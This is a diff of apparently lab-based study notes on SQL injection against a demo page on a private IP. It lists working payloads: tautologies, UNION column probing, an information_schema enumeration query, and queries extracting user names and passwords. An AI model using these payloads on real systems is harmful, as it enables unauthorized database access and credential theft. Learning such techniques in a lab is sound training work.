@@ -72,23 +72,33 @@ To USE SQL INJECTION
 
 
 
-To Look at databases you don't have direct access towards
+To Look at databases you don't have direct access 			           ######   POST METHODS    #######
 	Look at normal
 		try all of the things they have
 		try 					normal' OR 1='1
 		use UNION and select columns		Audi' Union SELECT 1,2,3,4,5 #
 		if it doesn't work keep going higher	
-		Looking for databases								****** Audi' Union SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #	******
+		Looking for databases								******GOLDEN RULE****** Audi' Union SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns #	******
 
 		Dive into Whatever we wanted		Audi' Union SELECT name,2,cost,type,color FROM session.car #
 			Be mindful of how many columns worked
 			Must be the exact amount
 							Audi' Union SELECT id,name,pass,3,4 FROM session.user #
 
+										###### GET METHOD       Original URL #######
+		http://10.50.28.178/uniondemo.php?Selection=4&Submit=Submit
+	MOdified url
+		http://10.50.28.178/uniondemo.php?Selection=4 OR 1=1
+		http://10.50.28.178/uniondemo.php?Selection=4 OR 1=1 ;
+		http://10.50.28.178/uniondemo.php?Selection=4 OR 1=1 #
+		http://10.50.28.178/uniondemo.php?Selection=4 OR 1=1; #
 
+	to see how many columns there
+		http://10.50.28.178/uniondemo.php?Selection=2 Union SELECT 1,2,3
+			Account for if the columns get flipped
+		http://10.50.28.178/uniondemo.php?Selection=2 Union SELECT 1,3,2
+	USE the GOLDEN RULE
+		http://10.50.28.178/uniondemo.php?Selection=2 Union SELECT table_schema,column_name,table_name FROM information_schema.columns
 
-
-
-
-
-
+		EXAMPLES
+			http://10.50.28.178/uniondemo.php?Selection=2 UNION SELECT session_id, user_id, remote_ip FROM session.session_log
